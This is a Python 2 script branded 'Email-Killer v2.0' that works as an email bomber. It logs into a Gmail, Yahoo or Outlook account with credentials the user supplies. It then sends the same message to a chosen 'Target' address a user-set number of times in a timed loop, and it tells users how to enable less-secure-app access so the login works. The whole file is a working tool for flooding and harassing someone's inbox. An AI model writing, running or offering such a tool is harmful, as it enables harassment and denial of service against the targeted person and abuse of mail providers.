import sys
import smtplib
import time
import os
import getpass


class bcolors:
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'


def killer():
	os.system('clear')
	print bcolors.OKGREEN + '''=================================''' + bcolors.ENDC
	print(bcolors.OKGREEN + '|:The AceViruses:|---------- ****')
	print(bcolors.OKGREEN + '|:Email-Killer v2.0:|------- ****')
	print(bcolors.OKGREEN + '|:Created By: LinuxDr0pz:|-- ****')
	print(bcolors.OKGREEN + '''=================================''')


os.system('clear')

# Input
print(bcolors.WARNING + '''
Choose Your Mail Service:
1) Gmail
2) Yahoo
3) Hotmail/Outlook
''' + bcolors.ENDC + '--------------------------------------------------------------')
try:
	server = raw_input(bcolors.OKGREEN + 'Mail Server: ' + bcolors.ENDC)
	user = raw_input(bcolors.OKGREEN + 'Enter Your Email: ' + bcolors.ENDC)
	pwd = getpass.getpass(bcolors.OKGREEN + 'Enter Your Password: ' + bcolors.ENDC)
	to = raw_input(bcolors.OKGREEN + 'Enter Target: ' + bcolors.ENDC)
	subject = raw_input(bcolors.OKGREEN + 'Subject (Optional): ' + bcolors.ENDC)
	body = raw_input(bcolors.OKGREEN + 'Message: ' + bcolors.ENDC)
	nomes = input(bcolors.OKGREEN + 'Number of Emails to send: ' + bcolors.ENDC)
	no = 0
	message = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
except KeyboardInterrupt:
	print bcolors.FAIL + '\nCanceled' + bcolors.ENDC
	sys.exit()

# Gmail

if server == '1' or server == 'gmail' or server == 'Gmail':
	killer()
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.ehlo()
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		print bcolors.FAIL + '''Your Username or Password is incorrect, please try again using the correct credentials
		Or you need to enable less secure apps
		On Gmail: https://myaccount.google.com/lesssecureapps ''' + bcolors.ENDC
		sys.exit()
	while no != nomes:
		try:
			server.sendmail(user, to, message)
			print bcolors.WARNING + 'Successfully sent ' + str(no + 1) + ' emails' + bcolors.ENDC
			no += 1
			time.sleep(.8)
		except KeyboardInterrupt:
			print bcolors.FAIL + '\nCanceled' + bcolors.ENDC
			sys.exit()
		except:
			print "Failed to Send "
	server.close()

# Yahoo
elif server == '2' or server == 'Yahoo' or server == 'yahoo':
	server = smtplib.SMTP("smtp.mail.yahoo.com", 587)
	killer()
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		print bcolors.FAIL + '''Your Username or Password is incorrect, please try again using the correct credentials
		Or you need to enable less secure apps
		On Yahoo: https://login.yahoo.com/account/security?.scrumb=Tiby8TXUvJt#less-secure-apps
		''' + bcolors.ENDC
		sys.exit()
	while no != nomes:
		try:
			server.sendmail(user, to, message)
			print bcolors.WARNING + 'Successfully sent ' + str(no + 1) + ' emails' + bcolors.ENDC
			no += 1
			time.sleep(.8)
		except KeyboardInterrupt:
			print bcolors.FAIL + '\nCanceled' + bcolors.ENDC
			sys.exit()
		except:
			print "Failed to Send"
	server.close()

# Hotmail/Outlook
elif server == '3' or server == 'outlook' or server == 'Outlook' or server == 'Hotmail' or server == 'hotmail':
	server = smtplib.SMTP("smtp-mail.outlook.com", 587)
	killer()
	server.ehlo()
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		print bcolors.FAIL + 'Your Username or Password is incorrect, please try again using the correct credentials' + bcolors.ENDC
		sys.exit()
	while no != nomes:
		try:
			server.sendmail(user, to, message)
			print bcolors.WARNING + 'Successfully sent ' + str(no + 1) + ' emails' + bcolors.ENDC
			no += 1
			time.sleep(.8)
		except KeyboardInterrupt:
			print bcolors.FAIL + '\nCanceled' + bcolors.ENDC
			sys.exit()
		except smtplib.SMTPAuthenticationError:
			print '\nThe username or password you entered is incorrect.'
			sys.exit()
		except:
			print "Failed to Send "
	server.close()

else:
	print 'Works only with Gmail, Yahoo, Outlook and Hotmail.'
	sys.exit()